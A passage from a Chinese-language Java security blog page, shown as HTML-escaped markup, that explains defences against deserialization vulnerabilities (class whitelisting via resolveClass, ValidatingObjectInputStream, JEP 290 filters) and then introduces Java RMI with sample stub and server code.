punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SerialObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;InvalidClassException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token string&#34;&gt;&#34;Unauthorized deserialization attempt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                desc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;resolveClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;desc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;以上的 Demo 就只允许序列化  &lt;code&gt;SerialObject&lt;/code&gt;  ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。&lt;/p&gt;
&lt;h3 id=&#34;53732-validatingobjectinputstream&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53732-validatingobjectinputstream&#34;&gt;#&lt;/a&gt; 5.3.7.3.2. ValidatingObjectInputStream&lt;/h3&gt;
&lt;p&gt;Apache Commons IO Serialization 包中的  &lt;code&gt;ValidatingObjectInputStream&lt;/code&gt;  类提供了  &lt;code&gt;accept&lt;/code&gt;  方法，可以通过该方法来实现反序列化类白 / 黑名单控制，一个 demo 如下&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;deserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; buffer&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ConfigurationException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt; obj&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ByteArrayInputStream&lt;/span&gt; bais &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buffer&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ValidatingObjectInputStream&lt;/span&gt; ois &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ValidatingObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bais&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ois&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SerialObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    obj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ois&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; obj&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;53733-objectinputfilterjep290&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53733-objectinputfilterjep290&#34;&gt;#&lt;/a&gt; 5.3.7.3.3. ObjectInputFilter(JEP290)&lt;/h3&gt;
&lt;p&gt;Java 9 提供了支持序列化数据过滤的新特性，可以继承  &lt;code&gt;java.io.ObjectInputFilter&lt;/code&gt;  类重写  &lt;code&gt;checkInput&lt;/code&gt;  方法来实现自定义的过滤器，并使用  &lt;code&gt;ObjectInputStream&lt;/code&gt;  对象的  &lt;code&gt;setObjectInputFilter&lt;/code&gt;  设置过滤器来实现反序列化类白 / 黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 进行了支持。这个机制主要描述了如下的机制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供一个限制反序列化类的机制，白名单或者黑名单&lt;/li&gt;
&lt;li&gt;限制反序列化的深度和复杂度&lt;/li&gt;
&lt;li&gt;为 RMI 远程调用对象提供了一个验证类的机制&lt;/li&gt;
&lt;li&gt;定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rmi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi&#34;&gt;#&lt;/a&gt; RMI&lt;/h1&gt;
&lt;h2 id=&#34;简介-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-11&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;RMI (Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、Spring RMI 等不同的实现。&lt;/p&gt;
&lt;p&gt;RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。&lt;/p&gt;
&lt;h2 id=&#34;调用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用步骤&#34;&gt;#&lt;/a&gt; 调用步骤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;客户调用客户端辅助对象 Stub 上的方法&lt;/li&gt;
&lt;li&gt;客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton&lt;/li&gt;
&lt;li&gt;服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象&lt;/li&gt;
&lt;li&gt;调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton&lt;/li&gt;
&lt;li&gt;服务端辅助对象将结果打包，发送给客户端辅助对象 Stub&lt;/li&gt;
&lt;li&gt;客户端辅助对象将返回值解包，返回给调用者&lt;/li&gt;
&lt;li&gt;客户获得返回值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;样例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#样例&#34;&gt;#&lt;/a&gt; 样例&lt;/h2&gt;
&lt;p&gt;一份代码样例如下 (来自《Enterprise JavaBeans》)：&lt;/p&gt;
&lt;h3 id=&#34;person接口定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#person接口定义&#34;&gt;#&lt;/a&gt; Person 接口定义&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;interface&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用personserver实现person&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用personserver实现person&#34;&gt;#&lt;/a&gt; 使用 PersonServer 实现 Person&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用person_stub实现person&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用person_stub实现person&#34;&gt;#&lt;/a&gt; 使用 Person_Stub 实现 Person&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// connect to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;computer_name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// pass method name to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 